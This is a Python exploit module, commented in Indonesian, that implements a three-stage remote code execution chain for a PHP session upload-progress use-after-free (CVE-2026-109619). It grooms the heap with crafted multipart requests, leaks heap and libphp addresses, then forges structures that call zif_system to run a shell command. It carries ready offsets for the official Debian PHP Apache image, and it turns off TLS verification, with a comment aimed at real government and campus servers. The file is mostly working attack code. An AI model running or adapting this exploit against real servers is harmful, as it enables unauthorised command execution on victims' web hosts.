#!/usr/bin/env python3
"""
lib/chain.py — mesin rantai eksploitasi CVE-2026-109619.

ATRIBUSI (WAJIB DIBACA — lihat ATTRIBUTION.md):
  CVE-2026-109618 / CVE-2026-109619 ("PHP2Shell") ditemukan pertama oleh
  Calif (Ryan A.) pada 1 Agustus 2026 dan dilaporkan ke PHP 11 Agustus
  2026. Wiz Research menemukannya secara independen (19 Agustus, lapor
  24 Agustus) — wiz.io/blog/php2shell-php-rce. OpenAI Codex Security
  melaporkan vektor tambahan 18 September. Ketiganya dikreditkan di
  advisori PHP. Riset mereka adalah dasar dari semua yang ada di file ini.
  Teknik rantai di file ini BUKAN karya kami. Ini port dari riset publik
  9bie (Qi Deng) — github.com/9bie/php2shell-bypass-aslr-exp — yang
  mempublikasikan exploit.py untuk CVE-2026-109619 (2-request
  session.upload_progress UAF + ASLR bypass via heap/libphp leak +
  aktuator pDestructor = zif_system). Upstream TIDAK mempublikasikan file
  lisensi; hak cipta default berlaku pada bagian yang merupakan port.
  Lisensi GPL-3.0 repo ini mencakup kode asli kami (orkestrasi, pagar,
  proof-reader, transport), tidak mengklaim ulang karya upstream.
  Verifikator crash CVE-2026-109618: ikow/php2shell-poc
  (poc/verify_oom_trigger.py) — dirujuk, tidak di-vendor.

INI BAGIAN INTI toolkit. Tidak memanggil exploit.py, tidak butuh file di luar
folder toolkit/. Semua trafik attacker berupa HTTP biasa.

PEMETAAN CVE (dikoreksi 2026-10-23, sumber: advisory primer php-src
GHSA-w8hw-w9fx-j79w = CVE-2026-109618, GHSA-6wmf-4rv5-p3rp = CVE-2026-109619):

  CVE-2026-109618 "RCE via OOM corruption"
    SATU request. OOM -> longjmp() -> request shutdown membaca memori
    request yang belum terinisialisasi penuh. Konsumen = shutdown procedure.
    Tool ini TIDAK mengimplementasikan rantai ini.

  CVE-2026-109619 "RCE via stale global state"
    DUA request di worker yang sama. Producer (request 1) menerbitkan
    request-owned state, lalu fatal/OOM menggagalkannya sebelum reset.
    Heap request dibebaskan, tapi global worker masih menunjuk ke sana.
    Request 2 membaca state basi itu lewat session upload progress
    SEBELUM inisialisasi normal sempat me-reset.
    Advisory: "With mod_php, both the producing operation and fatal error
    can occur during multipart startup." <- persis desain rantai di bawah.
    INILAH yang diimplementasikan tool ini.

Rantai 3 tahap (109619):
  stage 0  rotasi worker lewat HTTP (abort -> prefork fork worker baru)
  stage 1  Set-Cookie heap leak   -> Zend MM chunk base
  stage 2  Set-Cookie libphp leak -> libphp base (lewat ZVAL_PTR_DTOR)
  stage 3  upload_progress fake-ref -> pDestructor = zif_system -> cmd

Syarat di target:
  display_errors=1, memory_limit kecil (<=32M), max_input_vars besar,
  max_file_uploads besar, session.use_cookies=1, session.use_strict_mode=0,
  session.use_only_cookies=0, session.upload_progress.enabled=1,
  prefork satu worker.
"""

from __future__ import annotations

import re
import socket
import ssl
import struct
import threading
import time
import urllib.parse
from collections import Counter

# --------------------------------------------------------------- konstanta --

MAX_CMD = 14  # carrier zend_string 167 byte -> maksimum perintah

# --- offset relatif, tidak terpengaruh ASLR --------------------------------
# Lab build: PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12.
ZIF_OFFSET = 0x43A870     # zif_system
DTOR_OFFSET = 0x613C50    # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8   # string hidup 167 byte, dipakai sebagai HashTable palsu

# Kalibrasi bookworm: image resmi php:8.4.26-apache (Apache 2.4.69)
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

# Profil bawaan; bisa ditimpa --zif-offset / --dtor-offset / --htdata-offset
PROFILES = {
    "lab": {
        "zif": ZIF_OFFSET,
        "dtor": DTOR_OFFSET,
        "htdata": HTDATA_OFFSET,
        "stage1_n": 892,
        "stage2_t": 443,
        "stage2_v": 1,
        "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
        "stage3_carrier": False,
        "cve": "CVE-2026-109619",
        "verified": True,
    },
    "bookworm": {
        "zif": 0x465370,
        "dtor": 0x65EB60,
        "htdata": BOOKWORM_HTDATA_OFFSET,
        "stage1_n": BOOKWORM_STAGE1_N,
        "stage2_t": BOOKWORM_STAGE2_T,
        "stage2_v": BOOKWORM_STAGE2_V,
        "stage3_pads": list(BOOKWORM_STAGE3_PADS),
        "stage3_carrier": True,
        "cve": "CVE-2026-109619",
        "verified": True,
    },
}

# CVE-2026-109618: primitif crash-nya SAMA (multipart + OOM), tapi rantainya
# BEDA dan TIDAK diimplementasikan tool ini — konsumennya request shutdown
# procedure dalam SATU request, bukan consumer lintas-request.
# Bukti crash 109618 di lab memakai verifikator asli ikow/php2shell-poc
# (verify_oom_trigger.py), lihat laporan uji docker.
#
# Catatan data yang wajib dibaca sebelum memakai profil di bawah:
#   - Rantai 3-tahap tool ini MENARGETKAN 109619 (producer→fatal→stale state→
#     consumer upload_progress di worker sama) — sesuai advisory
#     GHSA-6wmf-4rv5-p3rp: "both the producing operation and fatal error can
#     occur during multipart startup" (mod_php).
#   - RCE end-to-end BELUM terbukti di mesin hidup dengan tool ini
#     (HEAP_LEAK_FAILED di lab prefork multi-worker). Grooming masih turunan
#     pembacaan source, bukan hasil kalibrasi eksekusi sukses.
#   - Gunakan hanya di lab berizin. verified=True berarti offset terverifikasi
#     dari binari, BUKAN klaim RCE.
SUPPORTED_109619 = True
# (PROFILES_109619 lama digabung ke PROFILES setelah koreksi label: rantai
# 3-tahap ini SATU-SATUNYA rantai yang diimplementasikan, dan menargetkan
# 109619. Tabel terpisah tidak lagi relevan.)

SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p1"


# ---------------------------------------------------------------- payloads --

def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    """Susun body multipart/form-data dari daftar {name, data, filename?}."""
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# ------------------------------------------------------------------ target --

class Target:
    """Koneksi TCP/TLS mentah supaya bentuk request sama persis dengan PoC.

    Tidak memakai curl_cffi: rantai ini butuh kontrol byte-level (kirim body
    bertahap, baca bersamaan dengan upload, biarkan worker abort di tengah).
    """

    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL harus http:// atau https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port),
                                             timeout=self.timeout)
                if self.https:
                    # Rantai berjalan lewat soket mentah, jadi TLS diatur di sini.
                    # check_hostname=False saja TIDAK cukup: itu hanya mematikan
                    # pencocokan nama, verifikasi rantai sertifikat tetap jalan.
                    # Akibatnya target nyata dengan CA store tak lengkap (umum pada
                    # server pemerintah/kampus) gagal di SSLCertVerificationError
                    # sebelum satu byte pun payload terkirim.
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        # Baca BERBARENGAN dengan upload: sebagian request membuat worker abort
        # tepat setelah mengirim Set-Cookie; recv() yang baru mulai setelah RST
        # kehilangan respons yang sudah ter-buffer.
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # worker boleh abort saat body masih dikirim
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


# ------------------------------------------------------------ leak parsing --

def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: modus pointer heap yang sejajar 2MB di dalam cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Stage 2: data Set-Cookie mulai di PS(id)+0x18 = nNextFreeElement|pDestructor.

    Pemeriksaan alignment 4KB, bukan 2MB: build lab kebetulan memetakan libphp
    di batas 2MB, tapi image resmi php:8.4.26-apache di batas 4KB.
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ------------------------------------------------------------------ chain --

class Chain:
    """Jalankan rantai penuh terhadap satu Target.

    Parameter `profile` menentukan kalibrasi grooming. `cve` hanya memilih
    profil mana yang dipakai; primitifnya sama.
    """

    def __init__(self, target: Target, cmd: str, profile: str = "bookworm",
                 cve: str = "CVE-2026-109619", zif_offset: int | None = None,
                 dtor_offset: int | None = None,
                 htdata_offset: int | None = None,
                 huge_mb: int = 12, verbose: bool = True):
        if cve == "CVE-2026-109618":
            raise NotImplementedError(
                "CVE-2026-109618 (OOM corruption, konsumen=shutdown) TIDAK "
                "diimplementasikan tool ini — rantai tool ini menargetkan "
                "CVE-2026-109619. Bukti crash 109618: verifikator asli "
                "ikow/php2shell-poc verify_oom_trigger.py."
            )
        table = PROFILES
        if profile not in table:
            raise ValueError(f"profil tidak dikenal: {profile}")

        p = table[profile]
        self.t = target
        self.cmd = cmd.encode()
        self.cve = cve
        self.profile = profile
        self.zif_offset = zif_offset if zif_offset is not None else p["zif"]
        self.dtor_offset = dtor_offset if dtor_offset is not None else p["dtor"]
        self.htdata_offset = (htdata_offset if htdata_offset is not None
                              else p["htdata"])
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.stage1_n = p["stage1_n"]
        self.stage2_t = p["stage2_t"]
        self.stage2_v = p["stage2_v"]
        self.stage3_pads = list(p["stage3_pads"])
        self.stage3_carrier = p["stage3_carrier"]

    # ---------- primitif request ----------

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        """Abort worker lewat HTTP; prefork mem-fork worker baru."""
        self.t.log("[*] rotasi worker lewat HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        # B tanpa file part: cleanup pre-RINIT menelusuri heap rusak -> abort
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        """Bocorkan Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # zend_string len palsu
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """Bocorkan libphp base lewat halaman HashTable 56 byte."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]",
                              "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"perintah {len(cmd)} byte; carrier 167 byte hanya muat "
                f"{MAX_CMD} (mis. pakai 'sh</out/c')"
            )
        ht = bytearray(b"\x00" * 167)
        # HashTable palsu
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # execute_data palsu di E = data+0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # zend_string palsu di data+0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # reference palsu (55 byte) di R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Tulis reference palsu menimpa PS(http_session_vars) lalu eksekusi."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # Jaga PS(id) tetap valid: php_session_initialize meninggalkan
            # send_cookie=0, jadi init B tidak mengalokasikan header Set-Cookie
            # di R0+16 (yang akan menimpa val.type).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # Reference bookworm masih hidup (rc=2). zend_string bin-40 15 byte
            # menaruh chars tepat di PS(http_session_vars): pertahankan gc
            # (rc=1, IS_REFERENCE), timpa 7 byte rendah val.value dengan
            # HashTable palsu, byte tinggi tetap 0x00 (0x00007f...).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)
